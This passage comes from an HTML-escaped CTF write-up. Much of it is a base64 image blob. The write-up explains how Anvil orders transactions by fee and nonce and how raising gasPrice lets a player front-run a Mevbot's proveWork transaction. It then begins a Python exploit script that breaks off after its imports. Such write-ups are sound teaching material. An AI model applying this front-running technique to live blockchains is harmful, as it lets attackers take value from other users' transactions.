YCT+dvqgXosvMtogv0Tjz3w89&#x2F;Z9wIlajBohHlCqi7AFMzAzHajalo55TxtbTVj7MZaNSDJW4MGWm8djnfwobQxT4VuXBEsLw4KSanU8Oy2HlmPyQoi6LUNKmV89+u7EuPyHjAQ8jw0fzECGXpP1t&#x2F;JmbcaOxS5sv&#x2F;kwbjK3admH5bfNghkoc56XwC+&#x2F;41iJ3xVM99Vb0YQDJeYPuDO&#x2F;peIZTC3fYEQE80cjQaf78KCocCJe1mvh8Tu2t9gpbmX0Otf+sOosW9oXlmbZ2qx5P1a8OgfyL1m+5p6RZiRbdVYEO1+J7Zwd5xbsfPzKsB3XyBuOIyVnMdksw5HvX297W&#x2F;tQ2&#x2F;TaFbvY92uzqrLr8MtKvaIIV&#x2F;fANrXvHzHPXl&#x2F;Vhn2xQ7XdPDw7dxGwaxdS8s1jm+0axfVQSCtGM84808cZXZbn6z6LAz1HY1Si2KfsOIbmina3zivy9XC2me24EcsW+P8d2O9htf8RrDg3yWo3x70Y8T4T+F1P573cSvJuwYklafh45Rbk60ZY8PRMPJbpxVN3ve&#x2F;8rixoQu2EHnjiZ1dirU4ihHQ+&#x2F;6D&#x2F;jyNupA1IhNdjfXX6kYcBac349GT8xPLFTRJGDa7F8tX70JI+A1POLsfyQ03IyHreyBYCeNmIWiGA0zFOLMsPuTDT9Po+fRhV4nre9KjaUjEh1SWE6+GoxLIse2a6FOCy7OU40CLShOidvDC6h4cFJTfhsK7XuJuLUCXqv8FWF3mvzfzgDtSv1vkJ2Zhh5vud17ht8bvf7p0mxIr8kZeR2JL9kKddVWYKFSl0piNV&#x2F;Eir&#x2F;MJi1GQ9gt9liiwzelsm6ioFhMqXS5Af&#x2F;RDcO00IGWu&#x2F;YlSlTTfKlkgxkesS4kXn67pZCCGxNKtWiAydL+thw4jaXYcir06wWIJfWuVJkaL3t0f4zHPzP6bCv02ewQGMxlKH39iNGUosynxxXomjMd12XtOxRu8rrRfAqEntZWkR4lAINLNs2SYZuXabgyFOfXUXS4BYtrWpWCyxHaS9M3Jj8d2Kv+38SahX11O0WbMbk3PmifQoroek4BsMbPwR9gR7gkwbjZRD8lqLY+TKdpdtPgTjrbqFvx6O+6xMPLDn29osbNmiPYXgrREPDkadjXt4mzovjVhXDxKqbA8Ssqb7yg57nwmUWLbVTSxtFsuSjJ5IbvTibfPCL5iMx0YnAsk9RUv5UXg5TiX&#x2F;O8azQwUhXYr4CWbLp&#x2F;wr3ICj+MgRgTGizkb+7Ujz7sMx+xc36VCqysyoqgfb&#x2F;cTqgiw3qrb5osW7F+4UwnMo8mbJtYdQZBfXmI+8wcCBN8wIcHhk2T5xvR6lJ5qAlLSoO96ty7dHsR&#x2F;C4WogNXW+Xjeo2nY9Ht4sP9nz5+O5XOd5xULf4hLc9&#x2F;mfA5Z&#x2F;XKU3CMtKDE8T9fLoiFhtGY41i3ql6B98Vy6GYj9etH6kl6C4QrSxu306o7281S6ul+CIELfmse8dNRqoWOMUTRZCtI4QbVYWvThvNzKnY1SiBzusNtmA3+wSgidtuE2YyiilWTfneUmR9Eub6Ck9eRwtiX0DhUqrEOLTHpGuPCIeIl1I18IxL2cSMsTDje962lmJ6VlJIdrUaO+WimJfXuVEJSKHDrKJwwj4HsQ2YM&#x2F;pJiT0iv6sF&#x2F;b&#x2F;Fqi7NHiUU5xTsf4Od9TRIvT1yBs0xHmfVRYrMT&#x2F;cFNRhyjbb08xX7S9F8YBc3wOQfJg0r4nf9QiP2eah&#x2F;gbaARlplv7lu4BN0paBRFwT8OR2Kc40fo1+A&#x2F;UqIaRLED&#x2F;BbPcpH+qNKQWLoN&#x2F;eKhrLn7Lyt5&#x2F;LDuwYSDqB+bg2BciYWo13PzAXmwVCsLv8GFrSb8ICuTLrNiH2jqFUCdTIeM4KgWzuq8R2ElpOvB29JULaP6x6BVo75APAYW3nkKzLT486eh2Os9Pz8dLVPw1Y&#x2F;viA3iAsHtQLgWwJYCmQE5tw7KQWVH36IiFxNJaaozaIxWGBaCsygmYr27RQdHmaz4qWay0yQu075zL76&#x2F;x2wBhxwVycVgd3L3HtGrw+K4IdVxpShbCsr9PrQaipDya040NGv6&#x2F;1p&#x2F;ZFtklC1iO2NntEPBDpzGgI1Z5txo0UUY8Oa&#x2F;PkTDy2pCd2KA&#x2F;zDjyQ1wf90IzPAk6mBz4T90S&#x2F;&#x2F;uf1OiGkK9AJlgxB5Ql40RvJIZ76G0960JjYG+0oE0gbkH5mw&#x2F;ZgLmbUVrD5bRxrMWwZE3KGAjEI3t01MowjbRNS8C7DKOzDf4tW0EqP8lQZJfbVa0u1zutg2hZh3oDqBvFf2nRDLAjxFhDVlREy&#x2F;TrYWmL11QZDvQqXUWJfuYH2iS6Kf0RYPljoj5G4d5oQZLC1aajX8a1AWipmpNltDcWo0nkSz7kwI2&#x2F;UelGjP4bCipIr5iG9p&#x2F;4YB6rOXKE&#x2F;tT&#x2F;SF2zeg+bi9H2HoWeaw06TlxJV+DgKjIfZDqGqAY1CHO9dKYSyTjJsGg1BHgTP45o+wJkvuldHS0IudDpFMCfnZCOt2QNviNdeaaOGIdkrRTXpXAybRMbUPToKHAxjm9TU55E3uDbA0hEa0xZhE+JBOtxZFgvlOfZ&#x2F;hGpCvflro&#x2F;zQ+nNE1uPTevF7ZVpJtPiOljZFmIVonewQWH4eSfkKOXE07rd7Mv2pO4sWh180FmwRzcy3HBFmKe58r7YNr6hPlBpC3xcZN8R3TCiBaHv1Hi3qtbrpv5UEsStEwopKin0ntW+E2R79Vv50&#x2F;Vmi7B92n7gDaVVICuGn1hYKu&#x2F;82wJoisMSj&#x2F;&#x2F;WKggjXY+0Xl4kHk+&#x2F;afVzglz3SV7yoVWMgG3Yamx&#x2F;atLUcsnUobDVGmzs96IHIjsryjZazv0QESk&#x2F;g48ZEjFlwi&#x2F;4uTUFJXn80Vp4IYgv7Dv2Sr8CZU3qVENIliI9g9htnecoAD7a&#x2F;ukk8cRv4&#x2F;MvGMhZvhhxBg8SX3QuvNzr62awP&#x2F;hN8SF9zzYgZGFUfZWc&#x2F;xXo8LDsxOewe9rJF&#x2F;vp9wIhlRnpuLbYcskXrNs&#x2F;C9mohNhbr&#x2F;UT+gRgizOvyjU6Cal85mobs9KjzOpTaOdjhdWOG9TraWHydlmSHLKOjnz3fIbhEGS&#x2F;Kjmv5Zn6UYxurY8uOYHq&#x2F;EWdxwPZUWlq+xuhMp8qUncWc0dKXtxodrNS+skOXI1IrO7cZ5UoRbr5yd3TG0n7TjFx9fNvEETJSa5QrRZ&#x2F;ZPuZ5+bfJIxjVUBx1Z6yXD0i&#x2F;s6632DfltL3ePruGsr6Y20U5gUlp+S71gGNaaCaf2+9oM9XJTLRTqnXOYrGNoS07ShY1OC045rWW40OvqHD57hXVGc3ndw64XmWxRs5DXw+F6nxWj9ntPcRZ5UTd0c88rlyiv4ed7Wl0qIw2Oh3+PgvS5mJx3sPiu6PCeDzy7y8Rnnrk3&#x2F;UG9iITj6lxmO&#x2F;E9ZVvYPCj4sndn3CdLQkhnUanDCvXFbk4h5XrTOSQds5h48y0oSfksHLdtD1kZNYa+kuj0obgWInfKAWEdDILV9ThiSE&#x2F;4hBndtSQldmosQ292X7IiWL+in67r8GYQp1ECOkSdI6HmRBkIMX&#x2F;&#x2F;bHsNCjSamq68cNDEO+tHDUgAbWoplgmXYy1S3uhHPVYvIId0IwHevlGqqPEMrB6w1+RU9ePYpmQLggjzBpGmNsZHYUJ5alUk5PUzMS7ft5h+4Qp3RX7BB8GISZQiAljvN&#x2F;AySg0&#x2F;hOUkMioyH9oX3C7TGhxQRBiAhPSvkz4ClUFQjQzmk9Il4SCWUPBTAghhBBCgkFLBiGEEEIIIWGgYCaEEEIIISQMFMyEEEIIIYSEgYKZEEIIIYSQMFAwE0IIIYQQEgYKZtLxyOG55KxZ&#x2F;rOnmelqiXKmrwuBC+S85KQUtRu+0WttRQ5r5zdTHIkvmW85ZhFsVyKULYdK9J8R78LDmPUx+DTm7czVhXj&#x2F;p09jol69IFj1W&#x2F;yi+Fa90pW4FbdW&#x2F;hZD9FoA85&#x2F;EL96J&#x2F;7256JZd+P3VeiUAOVRjE1brNXJhEB&#x2F;B7JqNKbapr+fMnY1kneXEjaFz5TaPYSh&#x2F;eLs&#x2F;cprbwuuQ65hiOY6EEgEOwWssMYmBzj6vaChowhPZl2HjvMt1Qgfj36YdJewI6eokPY1dY67C&#x2F;r2P4i2dZJF3C07IqbNfGaQTbCyYrIYgNZaZKHH8AaWg5HUzL9j+g&#x2F;Cute98nHg6RadHgRDK90nBeeJLNNrXYyHMeS14eqav3qWTsUqnR0YK5RLcOv8dnFWTPpnrKtMQypVPou96r1Fvc11lRknU9Q5s0zUfH0TqmNfxL0k6wcHl2LTvW8z501dYqFNI1yc+grl2E7YXPoiNenmvYRimTAv8uUzOmY0bGqrh1eukm2AKyAtq4owmHCgRddbCF1mLulH09BvsvbsBp15LwmKd0uGY94BeihpGY6n&#x2F;GwdCuj25+JcxI4GP1+D&#x2F;adJJGiXAFoisv+gEO1K43ZWIvSvXqzH7nxJfSWOW+MTlqlfuxJi691Reat57OPWTsTYBJ8X0WPTb&#x2F;4aRv7ISGH0n3hXHiooHfo2XDt+A+x4fibTsh3DfHV9i863RT9gT9rzEQ8Bjo5uxSdV7PTb9pT9mv34LoqvaO3gnsxBY&#x2F;GeMd&#x2F;8E4z9&#x2F;CL125uMdc0qD9Y&#x2F;j31YDkz+&#x2F;E2nuO0X9e+Ng5uM4q7MjEbHemV48petttOkE50NM06OYtPdvGD0m+JuEtUv7YGMdZ9G8kOgUS0bTuWb9yYZrNnKygI8OnNAJJG7ISKst+md&#x2F;JZmX86GKrspXrgH5aj8&#x2F;y4Ffmn2&#x2F;9n9lK20AvvIDopaO87LZBcxoZ64bSBTCzdomhH2itgzHmpOQ0kevS8K0WWSMV7&#x2F;W&#x2F;o56y3MS9bBHZAOiseHO26&#x2F;sIKJ04YpmDPyL3&#x2F;S76nhBzl+ep618eT9YZQfbvk+4evvwnPNTC23AuEc36jYRdTKvje3cQ9bb735VBEsLg7NsvahjB77iV9s6ronftbTnWdfEto1fmzqOLe&#x2F;nmAhzbEH4sp33mXPmSt95+&#x2F;7+&#x2F;ew6jr8ffyuP3z0ccC3C3f&#x2F;tgb38YPeGmWevt66zvS56W8d3w9V3YzQO4l+Pl+kEjRDE97uOIvWu9&#x2F;GZTrKzKj8TyX85ivxSY33do0dxCv0xQipLse&#x2F;knzRjb8lJIxMnsWV&#x2F;M5IzBxvCc8EojEn+AjserVe5KH0fO4QIHHhjkCh2NNR6oxad4c9LCPm8&#x2F;mjcfwAP6JQHSirRmJyG21p1Qb&#x2F;CuXDyoelLqEB0NES4Hgv6JwJ1dVin11FahzP6o4PPX8N+jMSsENaMxUXioSb7K1ozLhA6QTC7kTYgEV6P&#x2F;stXuDF00jCgYhOORX1Hk&#x2F;ZB&#x2F;Di4j1iRv9wyDzJynT8SCVmPYPK5Z1T+ioomZIzQPwqVR1Alrt1wuyBIEb8g3iPWNM8vb9URxQ54bXDvtOlIrTDqpZZX58C6q6TYyHX5osRltRiVr8&#x2F;LjHaKc0Xzfqww9w81PbUrF0MTPThSqdejaLNw5OVMB3aZx3wGB8RP6P2Ohwk3ZuT3xQ6VX4wqIeqnW20sf8xDn&#x2F;e90x7BqIZiX9k9p&#x2F;s9qJzH+CFf49RRPyuG+BGsgQvpDuHihxAAS7NqUaSPu6LChRkOsZKEUblmvYOdl8k8jB+QhCpP+71xSMgagvoSccxm0XYjzmKFtMOkDTeuSbh6R3EPh0XcZ&#x2F;eLB33zPlP3ubynonybcu+04Tii66Wuddp0v4cvcT4Fk8S56Xz7veB3Xup+joGwx45QtvM+C&#x2F;73nZH7ifW9UeQV98YoLcjD&#x2F;W0K8nIWOcr2&#x2F;7sM+3ffDmTkmu1t3E+TzXs4bL034DevGtfHuOfF36l4yKgquw6&#x2F;tL43gEXpP0Fz9duBVgwhYgf&#x2F;yhS8&#x2F;qTgGvGwfupDM9+IGA8Un&#x2F;r1F4IroyeSG71422wEFbUVgi65p7h7tLj7i8cSpTJyOvsn4kOfPtFFcqUF46aP8NKTB+Hd97wRbY7WkhH2vPrAldyMj9&#x2F;VQl7aRpaIBwMkwhVyjn870oIh5xL&#x2F;KfZ4&#x2F;oI9V8tos58lYzGw4+o3hN54Ay&#x2F;JaHO0loyw9RYPLO960WiL4q96RVwP+zWwKMNb1V9hYLpZKT92&#x2F;xAVjQ0YKU6DdH3iJ5gzF2kP869wA47iI9uXCDInqbTy8ti+8El7sAS&#x2F;tP+4KwHhJ5y8xZhabryCKz15HC2JfdUXsdy3WApotxmZkkJIiIcD8bNeJAzIDRpdyhs0RDyArcFvzAewymL142cXRuERP&#x2F;D5OpKUPxo1ZfYf7SjaLAyl5RN99RI&#x2F;tHtONyGhlz2CJ+0g5vGW4IgQI6kpxg9UXs4kZAhB9qK+Hk5WYniaB0VW3cSP+CGPXxt9h37JV+DMKb1q4UG9+eLHimxq8djgVYLkXrcUAL52KC3fJQTCEIy3ztteb31e9mPriFtZgRBb2I9i+3dAW&#x2F;Hustq06pBTQIWvd9vuYXmfJTQfxx597Jc94jvM+vuIzMtbnfeV&#x2F;VqbVJXdqM&#x2F;Nnj8Pz45wnleshD52hLLF&#x2F;THZcZ+FwPa9odqlZ5q6F6L62zQfdkIQ6u++PfC1t&#x2F;NvM3K9xfeCsm9Nx7Py71Scv10sSzvGtclATaNfdDkGVr0i&#x2F;bJ34vrKN&#x2F;CUjCK7bK+9pG1D+mnvAjZJW4YQntfYG0l7oJWVYKWM5BqCOiLSkiEtGIN7G32PzPV2w&#x2F;RfjwVel7YM&#x2F;SAQEWnJkBaMW9FX&#x2F;S2b6yrTsGRIC8b8NKPe5rrKbCNSUOe9gY8z71RtOhvvqWi0FXG28Vbj38TDyzUhOnj2wGd18nxpy7gQiJ9grlxjeZg3HuqNKQWLYLzFy8PY3N74aNcmw5hP4o7dNlFWMB1RPdxrlIA2f9xkJBY+8dDRvLzViGKalgp7ZM7dK0lFxn3nJURaos6MCpuHubBY&#x2F;NY5LSVtaTNDkPr2X5oVtFdIUOR5mQI2AFcaUlVE0lY3&#x2F;1fpE4Rg1h+dbEB1g2E7yRvUFzVCPJkPAC3n5IPsPKT3NKKGVtkRzru03u9GqJyo21Msh&#x2F;qK6xZ9VL71RK53W+5hdY62hwYpzqOOTkushwhjcVobJPY3G&#x2F;Kev84SoW0m4rHbhuMNgrz2OhIc6W+ztPxGFHl997G&#x2F;lSvc331HEtV3Su0cvFjhwigZnQ94oHAjJfo&#x2F;9QAG3jUfk2sNH&#x2F;LgR+vhdiWisVaoLUlyJh5b0hM7lKd2Bx7I6yP+zpvxmflF8ZOxqMlrMDy3UtipqHSDuLtiQAjlf5v+jl5pLxIxZsmdcJUaXuBx64xo+pkvzKhzNEih&#x2F;GvxVxsCKZTbVeAL1MOJWe83sLePaN9QHRabvkRzUm&#x2F;1RiAYVWeuQHK&#x2F;7&#x2F;Qa6cp0iocZlSfghXhalT8ymYOFcE7EDfnmKBq3+9aDdAwk7Yv0Kc6Q0SJTyMhXszovKpS&#x2F;14iyqAjM6bJ2fT0aHvkaVNe7ZD9ShSiy&#x2F;3i22F&#x2F;b6sUZ8YkWIwppRZra1GYr8bv80YCtbtLmEi2Rvb&#x2F;2eunF&#x2F;sp696XBvXYCWXZqykoVYT1y4CxSBs1TIqGm3vdjI18xO8ouNKNxgdij0wHEGJVvK2Hr3ZZ7uO4sWmxvI9R9ESnyaqJe8Ruv7c16dYR1KSideWxBpL9N08ol&#x2F;7ZqhEh1iubwf&#x2F;cdScTvFGllGXAcRQF2JYkH9a2y7terKCT+8p4SygY2YVnVgEYhjveuFEJZ5xo2DUMQr&#x2F;tCvjr6AptsEdAAD26nUIfaRqBx&#x2F;xtCKOskbdOojelHKP4YnvL3dL3rkX+XEM2N&#x2F;TE52OgjQiwnCtEc8FJPk9HvazSeuVSvka5Mpwjm5JxspDV74JU&#x2F;WPbIs1reFGK6GR+ViM9b4ye9Lmqaz1qRBukPjClaql9bGkKrFjvaK&#x2F;oVK8qD60O+Ak6INLKFFDsOS0EoVmJ6lp&#x2F;ntk1tBp8IFcLl&#x2F;hgizEY01N&#x2F;nqtHCb4Zf5y0nQjA3fo1+ocId4nE1peEIXhbtiQHTMbxnE+pVEMu4ztF7tYO0mQ3DWuIfyZ2P596uxrsffIznZumkNhNNvVt&#x2F;D987yvnwE8wHb1kslC&#x2F;Y&#x2F;1qb7SsQ+dFHeeUbAfFja1pJtAAOYNZm7PhAtOnbmzFBJ&#x2F;kIdewIZau&#x2F;NZ8VwXiAND5HQ1R&#x2F;mxY2q1Aw&#x2F;P7uTRaUyPuoGhse1QntQOR6a9&#x2F;yoTl4uXxNEA9&#x2F;GT4VAjE1OVevR88DH36hosTWyBa6I98hKdhKT+DjxkSMWWCOLqE701WeMATxOo&#x2F;qIDjbGhptEGaOTrR5ojuLerxd2Yxk2+gSC54eFsIL3AWxe8DzBuP65OCR8YnJV4mngs8CfeuK8&#x2F;rBp4deJ12ZS&#x2F;pedc33+nPHIf3Luel6RdB8FNtfDWXByMPYgmx8WfJUXDsAXjVgJP52+qBeiy&#x2F;SAyVfR3UORicyU&#x2F;C1VOxHjepAZUTg5I&#x2F;h0l67fEPCyR9P1SHNLgx0Gd5iv6HjnGWbyCiNfK2syg4QEDJCGo0vM7Bss1wL+crZISICy3bWQeercxyNBJ0qcZYdRZuFOS&#x2F;&#x2F;Yx6Qr3CtNpZly05HvgiotH&#x2F;IzlPW8f3rJzuZWVFk2Vvf+arYv13khCVPDPkRnvjZlVir0xS6vWTUUUbN5HGNSLqvzQLOzTp24PUwy1H4XwtHnX1MWPsxlo0QQntbOuY9rRMjoOqk2s+jzj3lkDhunfM+DV1vE13&#x2F;gHs4AkHuFcd9Zs8Xxyw6PQQzbH9PRhurjyr&#x2F;QMNoDDWvddC&#x2F;NTv2NhfHLDmLyZOAF+3nJQXz4mwktOzD8ttmYbdOloQ9dqSy7ddTtNmKc5NwP9bofY17UF2HUG90Qv5tBt6&#x2F;snzfNQm8zwL+7iWP7sG7U91oObQckxdG+90aWG&#x2F;fvaWPH7LeQe4fva2jfnLCkjHA5i0ForXsyHGSjY58Dv7yHlLNzmfSg3xXf+OzjBhL64VeM3zAdwoRbazJqK0vGi1xln&#x2F;qdWl&#x2F;0CsdSuTzkp0QVSdFSWMlngrhBY4vkertbG9J8DbNxb&#x2F;89GGkVEzCPZ&#x2F;rJDsTvkLVI+exPTeOQ3ySVhMfwXwBcPEKZnLxIWeZOgO8do1zaLmugBI6LhxYfT0e3qzTujABDzMCJUQRo&#x2F;Am7Yt+UKiJ4cErPhgCamj1c5jkP7Qc6X7IB6SsL&#x2F;Hkn4NMUiNYveEzTDnzY2QsZYT5QqBzPMyEkE7kcox5rScG3t2VpmZ9HhukdeACEstmh0IncqQS6I6SJP5oW0+XFMuSMvw&#x2F;ew8C1y8KMQMc6TaEm9FRIN&#x2F;0zemTgtUUyxcMjDBrGGHuSgS+dnUQ62tzEhRlzeiXCFe8pse+0Ahqt&#x2F;ChXrWfzA3YJqhFgBA7ESKP5MJn0S27cFN1CCuGesv3DQ7SinFBQcGsoWAmhBBCCCHBoCWDEEIIIYSQMFAwE0IIIYQQEgYKZkIIIYQQQsJAwUwIIYQQQkgYKJgJIYQQQggJAwUzIYQQQgghYYjPsHKu2ZiSPwzWLJL+U2P750u8b2LjVv+JczsODitHCCGEEEKC0SnjMKdNewFjYRPEUjBPAsrtIjrOUDATQgghhJBgdIolo+lcs&#x2F;5ECCGEEEJI16YTBLMbaQMS4fXEz25BCCGEEEJIa4mfYM5chDkFL4jlV7gBR&#x2F;FRpU43SRyGKSpfLouQppMJIYQQQgjpTDrFw6zEcy7wXuEaeHWSneScxzAl68uQ+R0BPcyEEEIIISQYnTOsXOUJIYR7I9ml1&#x2F;1oPOnptM5&#x2F;hBBCCCGE2OkUwZyck420Zg+8tTrBgRtDJw1DsleKakIIIYQQQjqX+FgylAUjXa8I&#x2F;MZhNiwYiXoNaKx4BdvLPXotPtCSQQghhBBCAgH+fzgyyp2L4ciwAAAAAElFTkSuQmCC&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Anvil enabled automining, where each transaction is packaged into a new block. However, in reality, the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;foundry-rs&#x2F;foundry&#x2F;blob&#x2F;master&#x2F;crates&#x2F;anvil&#x2F;src&#x2F;eth&#x2F;miner.rs#L73-L78&quot;&gt;anvil&#x2F;crates&#x2F;anvil&#x2F;src&#x2F;eth&#x2F;miner.rs#L73-L78&lt;&#x2F;a&gt; shows that &lt;code&gt;MiningMode&lt;&#x2F;code&gt; is overridden, so the mining strategy actually follows the later &lt;code&gt;IntervalMining&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Note that the files under the &lt;code&gt;infra&#x2F;&lt;&#x2F;code&gt; directory, except for &lt;code&gt;challenge.py&lt;&#x2F;code&gt;, are consistent with &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;paradigmxyz&#x2F;paradigm-ctf-infrastructure&#x2F;tree&#x2F;6c39333a674f18458bc27256091ab0306b9d432e&#x2F;paradigmctf.py&quot;&gt;paradigmxyz&#x2F;paradigm-ctf-infrastructure&lt;&#x2F;a&gt;  (no smuggling, lol).&lt;&#x2F;p&gt;
&lt;p&gt;The main problem in this challenge is competing with Mevbot. A similar challenge can be referenced from &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;dicegang&#x2F;dicectf-quals-2024-challenges&#x2F;tree&#x2F;main&#x2F;misc&#x2F;floordrop&quot;&gt;DiceCTF 2024 Quals misc floordrop&lt;&#x2F;a&gt;..&lt;&#x2F;p&gt;
&lt;p&gt;Although the actual implementation of transaction sorting in the source code is hard to locate, simple tests show that Anvil’s sorting strategy differs from Geth. Geth adjusts &lt;code&gt;nonce&lt;&#x2F;code&gt; in forward traversal, whereas Anvil sorts by fee first and then adjusts &lt;code&gt;nonce&lt;&#x2F;code&gt; in reverse traversal like:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;nonce		1		0		0
&lt;&#x2F;span&gt;&lt;span&gt;from	   EOA1    EOA2	   EOA1
&lt;&#x2F;span&gt;&lt;span&gt;gasPrice	3		2		1
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;		↓After sort↓
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;nonce		0		0		1
&lt;&#x2F;span&gt;&lt;span&gt;from       EOA2	   EOA1	   EOA1
&lt;&#x2F;span&gt;&lt;span&gt;gasPrice	2		1       3
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Meanwihle Geth (or consensus node in general) would sort like:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;nonce		1		0		0
&lt;&#x2F;span&gt;&lt;span&gt;from	  EOA1    EOA2	  EOA1
&lt;&#x2F;span&gt;&lt;span&gt;gasPrice	3		2		1
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;		↓After sort↓
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;nonce		0		1 	    0	
&lt;&#x2F;span&gt;&lt;span&gt;from       EOA1	   EOA1    EOA2	
&lt;&#x2F;span&gt;&lt;span&gt;gasPrice	1       3	    2	
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This means that we cannot use nonce disorder to move the &lt;code&gt;proveWork(bytes32)&lt;&#x2F;code&gt; transaction ahead of the Mevbot’s.&lt;&#x2F;p&gt;
&lt;p&gt;However, both Mevbot and the player have a preceding transaction, &lt;code&gt;registerBlock()&lt;&#x2F;code&gt;, before &lt;code&gt;proveWork(bytes32)&lt;&#x2F;code&gt;. The gas price for Mevbot’s transaction is not dynamically adjusted (nor should it be), and it subscribes to new blocks to send automatically. If we increase the &lt;code&gt;gasPrice&lt;&#x2F;code&gt; of &lt;code&gt;proveWork(bytes32)&lt;&#x2F;code&gt;, we can force Mevbot’s transaction into the the dilemma we encountered before:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;nonce          1                  0
&lt;&#x2F;span&gt;&lt;span&gt;price         higer              lower
&lt;&#x2F;span&gt;&lt;span&gt;callfunc proveWork(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes32&lt;&#x2F;span&gt;&lt;span&gt;) registerBlock()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;In this situation, although Mevbot’s &lt;code&gt;proveWork(bytes32)&lt;&#x2F;code&gt; has the highest &lt;code&gt;gasPrice&lt;&#x2F;code&gt; in the pending transaction pool, due to the &lt;code&gt;nonce&lt;&#x2F;code&gt; ordering, Anvil will adjust the &lt;code&gt;nonce&lt;&#x2F;code&gt; in ascending order, pushing Mevbot’s transaction back. This gives the player a chance to front-run &lt;code&gt;proveWork(bytes32)&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;exploit-script&quot;&gt;Exploit script&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;pwn &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import *
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;os
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;yaml
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;eth_account &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;Account
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;eth_account&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;signers&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;local &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;LocalAccount
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;web3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;Web3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;EthereumTesterProvider
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;web3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;middleware &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;SignAndSendRawMiddlewareBuilder
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;eth_abi &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;encode &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;encode_abi
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# context.log_level = &amp;#39;debug&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;get_uuid&lt;&#x2F;span&gt;&lt;span&gt;():
